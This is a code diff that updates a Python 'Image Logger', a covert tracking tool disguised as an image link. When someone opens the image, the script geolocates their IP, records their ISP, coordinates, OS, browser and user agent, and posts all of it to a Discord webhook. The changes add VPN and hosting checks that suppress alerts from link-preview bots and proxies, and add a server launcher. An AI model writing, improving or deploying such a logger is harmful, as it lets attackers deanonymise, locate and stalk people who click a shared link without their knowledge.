@@ -40,19 +40,18 @@ def botCheck(ip, useragent):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
-    return False
+    else:
+        return False
 
 def reportError(error):
     requests.post(config["webhook"], json={
         "username": config["username"],
         "content": "@everyone",
-        "embeds": [
-            {
-                "title": "Image Logger - Error",
-                "color": config["color"],
-                "description": f"An error occurred while trying to log an IP!\n\n**Error: **\n```\n{error}\n```",
-            }
-        ],
+        "embeds": [{
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n```\n{error}\n```"
+        }]
     })
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image_url=None):
@@ -60,64 +59,73 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
         return
 
     bot = botCheck(ip, useragent)
+
     if bot:
         if config["linkAlerts"]:
             requests.post(config["webhook"], json={
                 "username": config["username"],
                 "content": "",
-                "embeds": [
-                    {
-                        "title": "Image Logger - Link Sent",
-                        "color": config["color"],
-                        "description": f"An **Image Logging** link was sent in a chat!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
-                        "image": {"url": image_url or config["image"]}
-                    }
-                ]
+                "embeds": [{
+                    "title": "Image Logger - Link Sent",
+                    "color": config["color"],
+                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
+                    "image": {"url": image_url or config["image"]}
+                }]
             })
         return
 
     ping = "@everyone"
-    try:
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    except:
-        info = {}
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
 
-    os_name, browser = httpagentparser.simple_detect(useragent or "")
+    if info.get("proxy"):
+        if config["vpnCheck"] == 2:
+            return
+        if config["vpnCheck"] == 1:
+            ping = ""
+
+    if info.get("hosting"):
+        if config["antiBot"] in [3, 4]:
+            if not info.get("proxy"):
+                return
+        if config["antiBot"] == 2 and not info.get("proxy"):
+            ping = ""
+        if config["antiBot"] == 1:
+            ping = ""
+
+    os_name, browser = httpagentparser.simple_detect(useragent)
 
     embed = {
         "username": config["username"],
         "content": ping,
-        "embeds": [
-            {
-                "title": "Image Logger IP Logged",
-                "color": config["color"],
-                "description": f"""**A User Opened the Original Image!**
+        "embeds": [{
+            "title": "Image Logger IP Logged",
+            "color": config["color"],
+            "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** {endpoint}
 
 **IP Info:**
-> **IP:** {ip if ip else 'Unknown'}
-> **Provider:** {info.get('isp', 'Unknown')}
-> **ASN:** {info.get('as', 'Unknown')}
-> **Country:** {info.get('country', 'Unknown')}
-> **Region:** {info.get('regionName', 'Unknown')}
-> **City:** {info.get('city', 'Unknown')}
-> **Coords:** {str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}
-> **Timezone:** {info.get('timezone', 'Unknown')}
-> **Mobile:** {info.get('mobile', 'Unknown')}
-> **VPN:** {info.get('proxy', False)}
+> **IP:** `{ip or 'Unknown'}`
+> **Provider:** `{info.get('isp', 'Unknown')}`
+> **ASN:** `{info.get('as', 'Unknown')}`
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}`
+> **Timezone:** `{info.get('timezone', 'Unknown')}`
+> **Mobile:** `{info.get('mobile', 'Unknown')}`
+> **VPN:** `{info.get('proxy', False)}`
 > **Bot:** {"Possibly" if info.get('hosting', False) else "False"}
 
 **PC Info:**
-> **OS:** {os_name}
-> **Browser:** {browser}
+> **OS:** `{os_name}`
+> **Browser:** `{browser}`
 
 **User Agent:**
 {useragent}
 """,
-                "image": {"url": image_url or config["image"]}
-            }
-        ]
+            "image": {"url": image_url or config["image"]}
+        }]
     }
 
     requests.post(config["webhook"], json=embed)
@@ -146,3 +154,13 @@ class Handler(BaseHTTPRequestHandler):
             reportError(e)
             self.send_response(500)
             self.end_headers()
+
+def run_server():
+    port = 8080
+    from http.server import HTTPServer
+    server = HTTPServer(('0.0.0.0', port), Handler)
+    print(f"{_app_} running on port {port}")
+    server.serve_forever()
+
+if __name__ == "__main__":
+    run_server()
